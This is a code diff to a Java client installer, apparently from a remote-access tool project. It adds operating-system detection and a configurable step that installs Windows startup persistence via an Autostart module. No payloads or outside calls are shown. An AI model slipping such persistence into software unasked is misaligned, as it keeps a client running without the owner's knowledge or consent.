@@ -24,6 +24,7 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.URISyntaxException;
 
+import com.subterranean_security.crimson.client.modules.Autostart;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.util.B64;
 import com.subterranean_security.crimson.core.util.CUtil;
@@ -33,6 +34,7 @@ public class Installer {
 	public static ClientConfig ic;
 	public static String jarPath;
 	public static String jarDir;
+	private static OSFAMILY os;
 
 	private static boolean debug = new File("/debug.txt").exists();
 
@@ -90,14 +92,19 @@ public class Installer {
 		String base = null;
 		String name = System.getProperty("os.name").toLowerCase();
 		if (name.endsWith("bsd")) {
+			os = OSFAMILY.BSD;
 			base = ic.getPathBsd();
 		} else if (name.equals("mac os x")) {
+			os = OSFAMILY.OSX;
 			base = ic.getPathOsx();
 		} else if (name.equals("solaris") || name.equals("sunos")) {
+			os = OSFAMILY.SOL;
 			base = ic.getPathSol();
 		} else if (name.equals("linux")) {
+			os = OSFAMILY.LIN;
 			base = ic.getPathLin();
 		} else if (name.startsWith("windows")) {
+			os = OSFAMILY.WIN;
 			base = ic.getPathWin();
 		}
 
@@ -181,6 +188,24 @@ public class Installer {
 			return false;
 		}
 
+		if (ic.getAutostart()) {
+			switch (os) {
+			case SOL:
+			case BSD:
+			case LIN:
+			case OSX:
+				break;
+
+			case WIN:
+				Autostart.install_win(client);
+				break;
+			default:
+				break;
+
+			}
+
+		}
+
 		return execute(client);
 	}
 
@@ -199,4 +224,7 @@ public class Installer {
 		return true;
 	}
 
+	public enum OSFAMILY {
+		BSD, OSX, SOL, LIN, WIN, UNSUPPORTED;
+	}
 }
